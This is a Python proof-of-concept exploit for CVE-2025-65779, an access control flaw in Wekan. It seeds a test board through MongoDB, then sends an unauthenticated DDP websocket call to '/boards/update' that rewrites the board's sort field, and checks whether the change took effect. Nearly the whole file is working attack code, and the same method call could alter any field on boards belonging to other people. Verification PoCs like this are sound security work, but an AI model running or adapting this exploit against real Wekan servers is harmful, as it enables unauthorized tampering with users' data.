#!/usr/bin/env python3
"""
CVE-2025-65779 PoC - Wekan Improper Access Control
"""

import sys
import time
import json
import websocket
from pymongo import MongoClient
from datetime import datetime
from bson.objectid import ObjectId

TARGET_HOST = "localhost"
WEKAN_PORT = 8085
MONGO_PORT = 27017

def create_test_board():
    print("[*] Creating test board in MongoDB...")
    try:
        client = MongoClient(f'mongodb://{TARGET_HOST}:{MONGO_PORT}/')
        db = client['wekan']
        
        board_id = str(ObjectId())
        user_id = str(ObjectId())
        
        user_doc = {
            "_id": user_id,
            "username": f"testuser{int(time.time())}",
            "emails": [{"address": f"test{int(time.time())}@example.com", "verified": True}],
            "createdAt": datetime.utcnow(),
            "profile": {},
            "isAdmin": False
        }
        db.users.insert_one(user_doc)
        
        board_doc = {
            "_id": board_id,
            "title": f"VulnTest-{int(time.time())}",
            "slug": f"vulntest-{int(time.time())}",
            "archived": False,
            "createdAt": datetime.utcnow(),
            "modifiedAt": datetime.utcnow(),
            "permission": "public",
            "type": "board",
            "members": [{"userId": user_id, "isAdmin": True, "isActive": True}],
            "sort": 0
        }
        db.boards.insert_one(board_doc)
        
        print(f"[+] Board created: {board_id} (initial sort: 0)")
        return board_id, client
    except Exception as e:
        print(f"[-] Failed to create board: {e}")
        return None, None

def get_board_sort(client, board_id):
    try:
        db = client['wekan']
        board = db.boards.find_one({"_id": board_id})
        return board.get('sort') if board else None
    except:
        return None

def exploit_via_ddp(board_id, new_sort_value=999999):
    print(f"\n[*] Attempting unauthenticated board sort update via DDP...")
    ws_url = f"ws://{TARGET_HOST}:{WEKAN_PORT}/websocket"
    
    try:
        ws = websocket.create_connection(ws_url, timeout=10)
        
        connect_msg = {"msg": "connect", "version": "1", "support": ["1"]}
        ws.send(json.dumps(connect_msg))
        ws.recv()
        print("[+] DDP connection established")
        
        update_msg = {
            "msg": "method",
            "method": "/boards/update",
            "params": [
                {"_id": board_id},
                {"$set": {"sort": new_sort_value}}
            ],
            "id": "exploit1"
        }
        
        print(f"[*] Sending unauthenticated update: sort -> {new_sort_value}")
        ws.send(json.dumps(update_msg))
        
        for _ in range(5):
            try:
                ws.settimeout(1)
                response = ws.recv()
                resp_data = json.loads(response)
                if resp_data.get('msg') == 'result':
                    if 'error' not in resp_data:
                        print(f"[+] Server accepted the request")
                    else:
                        err = resp_data.get('error', {})
                        print(f"[-] Server error: {err.get('reason', str(err))}")
                    break
            except:
                pass
        
        ws.close()
        return True
    except Exception as e:
        print(f"[-] DDP exploit failed: {e}")
        return False

def main():
    print("=" * 60)
    print("CVE-2025-65779 PoC - Wekan Improper Access Control")
    print("=" * 60)
    
    board_id, mongo_client = create_test_board()
    if not board_id:
        print("[-] Failed to create test board")
        sys.exit(1)
    
    initial_sort = get_board_sort(mongo_client, board_id)
    print(f"[*] Initial sort value: {initial_sort}")
    
    time.sleep(2)
    
    new_sort_value = 999999
    exploit_via_ddp(board_id, new_sort_value)
    
    time.sleep(2)
    
    final_sort = get_board_sort(mongo_client, board_id)
    print(f"\n[*] Final sort value: {final_sort}")
    
    print("\n" + "=" * 60)
    if final_sort == new_sort_value:
        print("[+] VULNERABLE! Unauthenticated user successfully updated board sort")
        print(f"[+] Sort value changed: {initial_sort} -> {final_sort}")
        print("=" * 60)
        mongo_client.close()
        sys.exit(0)
    else:
        print("[-] NOT VULNERABLE or exploit failed")
        print(f"[-] Sort value: {initial_sort} -> {final_sort}")
        print("=" * 60)
        mongo_client.close()
        sys.exit(1)

if __name__ == "__main__":
    main()
